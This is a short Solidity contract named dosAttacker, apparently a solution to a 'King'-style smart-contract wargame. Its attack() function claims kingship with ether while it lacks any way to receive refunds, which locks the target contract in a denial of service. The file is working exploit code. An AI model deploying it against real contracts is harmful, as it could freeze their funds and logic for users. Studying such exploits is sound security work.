pragma solidity ^0.7.0;

import "./interfaces/Iking.sol";

contract dosAttacker {
    Iking public kingContract;

    constructor(address _kingContract) public {
        kingContract = Iking(_kingContract);
    }

    function attack() public payable {
        kingContract.becomeKing{value: msg.value}();
    }
}